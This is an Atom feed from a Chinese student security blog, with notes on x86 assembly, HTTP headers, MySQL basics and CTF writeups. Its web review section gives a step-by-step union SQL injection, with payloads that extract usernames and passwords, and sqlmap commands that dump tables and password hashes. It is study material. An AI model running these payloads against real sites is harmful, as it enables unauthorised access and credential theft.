<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Damya&#39;s Blog</title>
  
  <subtitle>あややこやや</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.damyahome.github.io/"/>
  <updated>2020-04-04T10:38:18.152Z</updated>
  <id>https://www.damyahome.github.io/</id>
  
  <author>
    <name>Damya</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>第五周课堂笔记(汇编)</title>
    <link href="https://www.damyahome.github.io/%E7%AC%AC%E4%BA%94%E5%91%A8%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0-%E6%B1%87%E7%BC%96/"/>
    <id>https://www.damyahome.github.io/%E7%AC%AC%E4%BA%94%E5%91%A8%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0-%E6%B1%87%E7%BC%96/</id>
    <published>2020-04-04T10:37:30.000Z</published>
    <updated>2020-04-04T10:38:18.152Z</updated>
    
    <content type="html"><![CDATA[<h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>主要寄存器:(32位)<br>EAX EBX ECX EDX:数据寄存器<br>ESI EDI:变址寄存器<br>ESP:指向栈顶<br>EBP:指向栈底<br>EIP:指向指令执行的下一条地址</p><p>R(64位)</p><p>（以上也是在栈中的位置顺序）</p><h2 id="常见的汇编指令"><a href="#常见的汇编指令" class="headerlink" title="常见的汇编指令"></a>常见的汇编指令</h2><p>mov eax,0x12  将0x12覆盖的存入eax<br>mov eax,ebx   将ebxd的值覆盖的存入eax<br>add eax，ebx  将ebx+eax并覆盖的存入eax<br>inc eax       eax++<br>edc eax       eax–</p><h2 id="PUSH"><a href="#PUSH" class="headerlink" title="PUSH"></a>PUSH</h2><p>push指令将操作数压入内存的栈中<br>个人理解：栈结构不变，push数据（压栈）前，先将esp值减4，再将操作数内容压入esp指示的位置，再自行+4恢复到栈顶位置<br>push eax    将eax内容压栈<br>push [var]  将var指示的4直接内容压栈</p><h2 id="POP"><a href="#POP" class="headerlink" title="POP"></a>POP</h2><p>pop指令与push指令相反,执行出栈工作<br>个人理解：栈结构不变，pop数据（出栈）前，先将esp指示地址中的内容出栈，然后esp值+4恢复栈顶位置<br>pop edi    将edi内容出栈<br>pop [ebx]  将ebx指示的4直接内容出栈</p><h2 id="CALL"><a href="#CALL" class="headerlink" title="CALL"></a>CALL</h2><p>call指令实现子程序的调用<br>个人理解：call指令先将当前执行指令地址入栈，然后无条件转移到由标签指示的指令，但依旧保存调用前的地址信息，当调用结束后返回到调用前的地址</p><h2 id="RET"><a href="#RET" class="headerlink" title="RET"></a>RET</h2><p>ret指令实现子程序的返回<br>个人理解：ret指令弹出栈中保存的指令地址，然后无条件转移到保存的指令地址执行，等待下一次返回数据</p><h2 id="调用约定画图理解"><a href="#调用约定画图理解" class="headerlink" title="调用约定画图理解"></a>调用约定画图理解</h2><figure class="image-box">                <img src="./pwn_pic.png" alt title class>                <p></p>            </figure><p>(以下纯个人理解,有不对的地方虚心听教)</p><p>main函数里定义A子程序,并赋值1,2,3,A子程序里返回a+b+c的值<br>old ebp是原栈底,一个保存原栈底地址的寄存器,内容可变结构不变<br>ret add返回由1,2,3赋值后的a+b+c,当有值被定义时就返回值,地址位置自行变化,功能不变<br>mov ebp,esp,有新内容进来,一个入栈过程,将ebp的地址转移到esp<br>leave,一个出栈过程,mov esp,ebp,将栈顶地址转移到栈底,pop出来一个ebp地址的内容,但因为已经将esp地址转移到ebp,所以pop ebp的内容依旧是在出栈,retn返回出栈的值</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;寄存器&quot;&gt;&lt;a href=&quot;#寄存器&quot; class=&quot;headerlink&quot; title=&quot;寄存器&quot;&gt;&lt;/a&gt;寄存器&lt;/h2&gt;&lt;p&gt;主要寄存器:(32位)&lt;br&gt;EAX EBX ECX EDX:数据寄存器&lt;br&gt;ESI EDI:变址寄存器&lt;br&gt;ESP:指向栈顶&lt;
      
    
    </summary>
    
    
      <category term="笔记" scheme="https://www.damyahome.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="汇编" scheme="https://www.damyahome.github.io/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>第一周复习(WEB)</title>
    <link href="https://www.damyahome.github.io/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%A4%8D%E4%B9%A0-WEB/"/>
    <id>https://www.damyahome.github.io/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%A4%8D%E4%B9%A0-WEB/</id>
    <published>2020-04-03T09:03:13.000Z</published>
    <updated>2020-04-03T09:05:37.148Z</updated>
    
    <content type="html"><![CDATA[<p>线上分享第一周主要以复习为主，在家估计都把原来学的忘的差不多了，所有人各个方向，这周提前复习一下HTTP协议（传参类型、常用伪造形式、各个文件头的大概作用、burp/postman/hackbar工具熟悉使用）html基础（web页面、常用标签、自己编写内容）、sql基础（mysql语言学习、增删改查、联合查询的方式、基础的sql注入点挖掘、sqlmap使用）这些内容提前复习，在分享会时候会让各位都进行实操和讲解，对不会的地方进行详细讲解，保证大部分人的时间不浪费</p><h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><h3 id="传参类型"><a href="#传参类型" class="headerlink" title="传参类型"></a>传参类型</h3><p>GET POST(辅助工具 hackbar burpsuite postman)</p><h3 id="常用伪造形式"><a href="#常用伪造形式" class="headerlink" title="常用伪造形式"></a>常用伪造形式</h3><p>X-Forwarded-For： 伪造请求的ip</p><p>User-Agent: 伪造应用信息</p><p>Accept-Language: 伪造请求语言</p><p>Host： 伪造请求的服务器的ip</p><p>GET/POST: 伪造发包方式</p><h3 id="常见攻击形式"><a href="#常见攻击形式" class="headerlink" title="常见攻击形式"></a>常见攻击形式</h3><p>跨站脚本攻击(XSS) 跨站请求伪造攻击(CSRF) Http Heads攻击 Cookie攻击 重定向攻击</p><h3 id="数据包文件头的作用"><a href="#数据包文件头的作用" class="headerlink" title="数据包文件头的作用"></a>数据包文件头的作用</h3><h4 id="通用头部"><a href="#通用头部" class="headerlink" title="通用头部"></a>通用头部</h4><p>Request URL: 请求地址</p><p>Request Method: 请求方式（get post put delete trace header）</p><p>Status Code: 200 (状态码和原因短语)</p><p>Remote Address: 127.0.0.1:80 （请求ip）</p><p>Referrer Policy: no-referrer-when-downgrade(是否有代理)</p><h4 id="响应头部"><a href="#响应头部" class="headerlink" title="响应头部"></a>响应头部</h4><p>Connection: 连接</p><p>Content-Type: application/json;charset=UTF-8（内容类型）</p><p>Date: Mon, 24 Jun 2019 11:12:18 GMT（做出响应的时间）</p><p>Server: nginx/1.13.6 （服务器类型）</p><p>Transfer-Encoding: chunked （消息首部指明将信息安全传递给用户所采用的编码形）</p><h4 id="请求头部"><a href="#请求头部" class="headerlink" title="请求头部"></a>请求头部</h4><p>Accept: application/json, text/plain, / （接收类型）</p><p>Accept-Encoding: gzip, deflate （接收压缩内容使用的编码）</p><p>Accept-Language: zh-CN,zh;q=0.9 （接收语言）</p><p>Connection: keep-alive （连接成功）</p><p>Cookie: JSESSIONID=0AC68B437A980871D1E6C4479DCCF965 (COOKIE信息)</p><p>Host: <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> （响应主机域名）</p><p>Referer: <a href="http://www.baidu.com" target="_blank" rel="noopener">http://www.baidu.com</a> (响应地址)</p><p>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 （浏览器应用信息)</p><h4 id="实体头部包含发出请求的参数信息"><a href="#实体头部包含发出请求的参数信息" class="headerlink" title="实体头部包含发出请求的参数信息."></a>实体头部包含发出请求的参数信息.</h4><h3 id="burp-postman-hackbar工具熟悉使用"><a href="#burp-postman-hackbar工具熟悉使用" class="headerlink" title="burp/postman/hackbar工具熟悉使用"></a>burp/postman/hackbar工具熟悉使用</h3><h4 id="burpsuite常用功能"><a href="#burpsuite常用功能" class="headerlink" title="burpsuite常用功能"></a>burpsuite常用功能</h4><p>proxy:抓包</p><p>spider:爬虫</p><p>intruder:爆破密码</p><p>repeater:发包改包</p><p>extender:添加插件</p><h4 id="postman"><a href="#postman" class="headerlink" title="postman"></a>postman</h4><figure class="image-box">                <img src="https://img-blog.csdn.net/20180523232921542?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Z4YmluMTIz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt title class>                <p></p>            </figure><p><a href="https://blog.csdn.net/fxbin123/article/details/80428216" target="_blank" rel="noopener">详细使用</a></p><h4 id="hackbar"><a href="#hackbar" class="headerlink" title="hackbar"></a>hackbar</h4><p>有多种注入方式可用xss,sql等,支持get,post传参,带http协议头传参等.</p><h2 id="html基础"><a href="#html基础" class="headerlink" title="html基础"></a>html基础</h2><h3 id="web页面"><a href="#web页面" class="headerlink" title="web页面"></a>web页面</h3><p>随便找一个页面都能说.</p><h3 id="常用标签"><a href="#常用标签" class="headerlink" title="常用标签"></a>常用标签</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;&lt;head&gt;&lt;meta&gt;&lt;link&gt;&lt;title&gt;&lt;body&gt;&lt;div&gt;&lt;textarea&gt;&lt;span&gt;等</span><br></pre></td></tr></table></figure><h3 id="自己编写内容"><a href="#自己编写内容" class="headerlink" title="自己编写内容"></a>自己编写内容</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"header"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"./index.html#onepage"</span>&gt;</span>新番资讯<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#twopage"</span>&gt;</span>我的追番<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"./threepage.html#threepage"</span>&gt;</span>番剧推荐<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"move"</span>&gt;</span> <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 动漫资讯 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"contain"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"sildeInput"</span> <span class="attr">value</span>=<span class="string">"1"</span> <span class="attr">id</span>=<span class="string">"Input1"</span> <span class="attr">hidden</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"label1"</span> <span class="attr">for</span>=<span class="string">"Input1"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"sildeInput"</span> <span class="attr">value</span>=<span class="string">"1"</span> <span class="attr">id</span>=<span class="string">"Input2"</span> <span class="attr">hidden</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"label2"</span> <span class="attr">for</span>=<span class="string">"Input2"</span>&gt;</span>2<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"sildeInput"</span> <span class="attr">value</span>=<span class="string">"0"</span> <span class="attr">id</span>=<span class="string">"Input3"</span> <span class="attr">hidden</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"label3"</span> <span class="attr">for</span>=<span class="string">"Input3"</span>&gt;</span>3<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./images/bg.jpg"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./images/bg.jpg"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./images/bg.jpg"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="sql基础"><a href="#sql基础" class="headerlink" title="sql基础"></a>sql基础</h2><h3 id="mysql语言学习"><a href="#mysql语言学习" class="headerlink" title="mysql语言学习"></a>mysql语言学习</h3><h4 id="最常用的显示命令"><a href="#最常用的显示命令" class="headerlink" title="最常用的显示命令"></a>最常用的显示命令</h4><p>1、显示数据库列表:</p><p>show databases;</p><p>2、显示库中的数据表：</p><p>use mysql;</p><p>show tables;</p><p>3、显示数据表的结构：</p><p>describe 表名;</p><p>4、建库：</p><p>create database 库名;</p><p>5、建表：</p><p>use 库名；</p><p>create table 表名;</p><p>6、删库和删表:</p><p>drop database 库名;</p><p>drop table 表名;</p><p>7、将表中记录清空：</p><p>delete from 表名;(清空数据表内容,保留自增id,可恢复)</p><p>truncate table 表名;（成功则返回0,自增id也一同会被清掉,不可恢复）</p><p>8、显示表中的记录：</p><p>select * from 表名;</p><p>9、显示当前的user：</p><p>SELECT USER();</p><h4 id="连接MySQL"><a href="#连接MySQL" class="headerlink" title="连接MySQL"></a>连接MySQL</h4><p>格式: mysql -h 主机地址 -u用户名 -p用户密码</p><p>退出MYSQL命令： exit （回车）</p><h4 id="修改新密码"><a href="#修改新密码" class="headerlink" title="修改新密码"></a>修改新密码</h4><p>方法一<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">update user set password=PASSWORD(&apos;新密码&apos;) where user=&apos;用户名&apos;;</span><br><span class="line">flush privileges; #有关用户变动的都需要更新权限</span><br><span class="line">quit; #退出</span><br></pre></td></tr></table></figure></p><p>方法二</p><p>格式：mysqladmin -u用户名 -p旧密码 password 新密码</p><h4 id="增加新用户"><a href="#增加新用户" class="headerlink" title="增加新用户"></a>增加新用户</h4><p>格式：grant select on 数据库.* to 用户名@登录主机 identified by “密码”</p><p>如增加一个用户test2密码为abc,让他只可以在localhost上登录,并可以对数据库mydb进行查询、插入、修改、删除的操作（localhost指本地主机,即MYSQL数据库所在的那台主机）,这样用户即使用知道test2的密码也无法从internet上直接访问数据库,只能通过MYSQL主机上的web页来访问.</p><p>grant select,insert,update,delete on mydb.* to test2@localhost identified by “abc”;</p><h4 id="删除用户"><a href="#删除用户" class="headerlink" title="删除用户"></a>删除用户</h4><p>格式: delete from user where user=’用户名’ and host=’localhost’;</p><p>删除用户的数据库: drop database dbname;</p><h3 id="增删改查"><a href="#增删改查" class="headerlink" title="增删改查"></a>增删改查</h3><h4 id="增"><a href="#增" class="headerlink" title="增"></a>增</h4><p>命令:alter table 表名 add 字段 类型 其他;</p><p>alter table MyClass add passtest int(4) default ‘0’</p><h4 id="删"><a href="#删" class="headerlink" title="删"></a>删</h4><p>命令:delete from 表名 where 表达式</p><p>delete from MyClass where id=1;</p><h4 id="改"><a href="#改" class="headerlink" title="改"></a>改</h4><p>命令:update 表名 set 字段=新值,… where 条件</p><p>update MyClass set name=’Mary’ where id=1;</p><h4 id="查"><a href="#查" class="headerlink" title="查"></a>查</h4><p>查询所有行</p><p>mysql&gt; select * from MyClass;</p><p>查询前几行数据</p><p>mysql&gt; select * from MyClass order by id limit 0,2;</p><h3 id="联合查询的方式"><a href="#联合查询的方式" class="headerlink" title="联合查询的方式"></a>联合查询的方式</h3><h4 id="联合查询的注意事项"><a href="#联合查询的注意事项" class="headerlink" title="联合查询的注意事项:"></a>联合查询的注意事项:</h4><p>1.两个查询语句的查询结果中的列类型要一样。</p><p>2.两个查询语句的查询结果中的列的数量要相同。</p><p>3.两个查询语句的查询结果中的列名可以不一致，如果没有特定指定，按照第一个查询语句的列名来显示。</p><h4 id="联合注入的过程"><a href="#联合注入的过程" class="headerlink" title="联合注入的过程"></a>联合注入的过程</h4><p>1.判断注入点   ?id=1 and 1=1  ?id=1’</p><p>2.判断是整型还是字符型   ?id=1 and 1=1/1=2%23</p><p>3.判断查询列数  ?id=1’ order by 4%23</p><p>4.判断显示位  ?id=-1’ union select 1,2,3%23</p><p>5.获取所有数据库名<br>?id=-1’ union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)%23</p><p>6.获取数据库所有表名<br>?id=-1’ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),3%23</p><p>7.获取列名<br>?id=-1’ union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=’security’ and table_name=’users’),3%23</p><p>8.获取字段名<br>?id=-1’ union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 1,1),3%23 </p><h3 id="基础的sql注入点挖掘"><a href="#基础的sql注入点挖掘" class="headerlink" title="基础的sql注入点挖掘"></a>基础的sql注入点挖掘</h3><p>1.单引号判断  ?id=1’</p><p>2.数字型判断  ?id=1 and 1=1/1=2  id=123-1</p><p>3.字符型判断  ?id=1’ and ‘1’=’1/2</p><p>4.文本型判断  ?id=123’%2B’asdf</p><p>5.输入框判断  #@!$/ …</p><h3 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u url --dbs //爆数据库</span><br><span class="line">sqlmap.py -u url --current-db //爆当前库</span><br><span class="line">sqlmap.py -u url --current-user //爆当前用户</span><br><span class="line">sqlmap.py -u url --users   查看用户权限</span><br><span class="line">sqlmap.py -u url --tables -D 数据库 //爆表段</span><br><span class="line">sqlmap.py -u url --columns -T 表段 -D 数据库 //爆字段</span><br><span class="line">sqlmap.py -u url --dump -C 字段 -T 表段 -D 数据库 //猜解</span><br><span class="line">sqlmap.py -u url --dump --start=1 --stop=3 -C 字段 -T 表段 -D 数据库 //猜解1到3的字段</span><br><span class="line"></span><br><span class="line">sqlmap.py -u url  判断</span><br><span class="line">sqlmap.py -u url --is-dba -v   这是判断当前数据库的使用者是否是dba</span><br><span class="line">sqlmap.py -u url --users -v 0  这句的目的是列举数据库的用户</span><br><span class="line">sqlmap.py -u url --passwords -v 0 这句的目的是获取数据库用户的密码</span><br><span class="line">sqlmap.py -u url --privileges -v 0 这是判断当前的权限</span><br><span class="line">sqlmap.py -u url --dbs -v 0 这句的目的是将所有的数据库列出来</span><br><span class="line">sqlmap.py -u url --tables -D &apos;表&apos; 爆表</span><br><span class="line">sqlmap.py -u url --columns -T ‘表’-D ‘数据库’爆列</span><br><span class="line">sqlmap.py -u url --dump -T &apos;表&apos; --start 1 --stop 4 -v 0 这里是查询第2到第4行的内</span><br><span class="line">sqlmap.py -u url --dump -all -v 0</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;线上分享第一周主要以复习为主，在家估计都把原来学的忘的差不多了，所有人各个方向，这周提前复习一下HTTP协议（传参类型、常用伪造形式、各个文件头的大概作用、burp/postman/hackbar工具熟悉使用）html基础（web页面、常用标签、自己编写内容）、sql基础（
      
    
    </summary>
    
    
      <category term="笔记" scheme="https://www.damyahome.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="WEB知识" scheme="https://www.damyahome.github.io/tags/WEB%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>第四周两道题wp(SQL注入)</title>
    <link href="https://www.damyahome.github.io/%E7%AC%AC%E5%9B%9B%E5%91%A8%E4%B8%A4%E9%81%93%E9%A2%98wp-SQL%E6%B3%A8%E5%85%A5/"/>
    <id>https://www.damyahome.github.io/%E7%AC%AC%E5%9B%9B%E5%91%A8%E4%B8%A4%E9%81%93%E9%A2%98wp-SQL%E6%B3%A8%E5%85%A5/</id>
    <published>2020-04-03T08:59:39.000Z</published>
    <updated>2020-04-03T09:00:40.205Z</updated>
    
    <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br><div class="row">    <embed src="第四周两道题wp(SQL注入).pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pdf插件加载比较慢,请稍等一下下哈&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;第四周两道题wp(SQL注入).pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pdf&quot;&gt;
	&lt;/div&gt;
      
    
    </summary>
    
    
      <category term="ctf writeup" scheme="https://www.damyahome.github.io/categories/ctf-writeup/"/>
    
    
      <category term="sql注入" scheme="https://www.damyahome.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>第二周四道题wp(代码审计)</title>
    <link href="https://www.damyahome.github.io/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%9B%9B%E9%81%93%E9%A2%98wp/"/>
    <id>https://www.damyahome.github.io/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%9B%9B%E9%81%93%E9%A2%98wp/</id>
    <published>2020-03-13T15:24:35.000Z</published>
    <updated>2020-04-03T08:58:18.575Z</updated>
    
    <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br><div class="row">    <embed src="第二周四道题wp.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pdf插件加载比较慢,请稍等一下下哈&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;第二周四道题wp.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pdf&quot;&gt;
	&lt;/div&gt;


&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="ctf writeup" scheme="https://www.damyahome.github.io/categories/ctf-writeup/"/>
    
    
      <category term="sql注入" scheme="https://www.damyahome.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>2020高校战疫CTF wp</title>
    <link href="https://www.damyahome.github.io/2020%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%ABCTF-wp/"/>
    <id>https://www.damyahome.github.io/2020%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%ABCTF-wp/</id>
    <published>2020-03-10T02:18:21.000Z</published>
    <updated>2020-03-10T02:20:53.574Z</updated>
    
    <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br><div class="row">    <embed src="2020高校战疫CTF__wp.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pdf插件加载比较慢,请稍等一下下哈&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;2020高校战疫CTF__wp.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pdf&quot;&gt;
	&lt;/div&gt;
      
    
    </summary>
    
    
      <category term="ctf writeup" scheme="https://www.damyahome.github.io/categories/ctf-writeup/"/>
    
    
      <category term="个人ctf竞赛" scheme="https://www.damyahome.github.io/tags/%E4%B8%AA%E4%BA%BActf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>GXYCTF writeup Mini_Ginkgo</title>
    <link href="https://www.damyahome.github.io/GXYCTF-writeup-Mini-Ginkgo/"/>
    <id>https://www.damyahome.github.io/GXYCTF-writeup-Mini-Ginkgo/</id>
    <published>2020-01-02T13:31:42.000Z</published>
    <updated>2020-01-03T13:21:39.270Z</updated>
    
    <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br><div class="row">    <embed src="GXYCTF_writeup_Mini_Ginkgo.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pdf插件加载比较慢,请稍等一下下哈&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;GXYCTF_writeup_Mini_Ginkgo.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pd
      
    
    </summary>
    
    
      <category term="ctf writeup" scheme="https://www.damyahome.github.io/categories/ctf-writeup/"/>
    
    
      <category term="团队ctf竞赛" scheme="https://www.damyahome.github.io/tags/%E5%9B%A2%E9%98%9Fctf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>XCTF攻防世界刷题(WEB部分)(高手进阶区)(简单部分)</title>
    <link href="https://www.damyahome.github.io/XCTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-WEB%E9%83%A8%E5%88%86-%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6%E5%8C%BA-%E7%AE%80%E5%8D%95%E9%83%A8%E5%88%86/"/>
    <id>https://www.damyahome.github.io/XCTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-WEB%E9%83%A8%E5%88%86-%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6%E5%8C%BA-%E7%AE%80%E5%8D%95%E9%83%A8%E5%88%86/</id>
    <published>2020-01-02T13:26:11.000Z</published>
    <updated>2020-01-03T13:22:24.502Z</updated>
    
    <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br><div class="row">    <embed src="XCTF攻防世界刷题(WEB部分)(高手进阶区)(简单部分).pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pdf插件加载比较慢,请稍等一下下哈&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;XCTF攻防世界刷题(WEB部分)(高手进阶区)(简单部分).pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;applicatio
      
    
    </summary>
    
    
      <category term="ctf writeup web" scheme="https://www.damyahome.github.io/categories/ctf-writeup-web/"/>
    
    
      <category term="个人ctf竞赛" scheme="https://www.damyahome.github.io/tags/%E4%B8%AA%E4%BA%BActf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>XCTF攻防世界刷题(WEB部分)(新手区)</title>
    <link href="https://www.damyahome.github.io/XCTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-WEB%E9%83%A8%E5%88%86-%E6%96%B0%E6%89%8B%E5%8C%BA/"/>
    <id>https://www.damyahome.github.io/XCTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-WEB%E9%83%A8%E5%88%86-%E6%96%B0%E6%89%8B%E5%8C%BA/</id>
    <published>2020-01-02T13:22:45.000Z</published>
    <updated>2020-01-03T13:22:13.663Z</updated>
    
    <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br><div class="row">    <embed src="XCTF攻防世界刷题(WEB部分)(新手区).pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
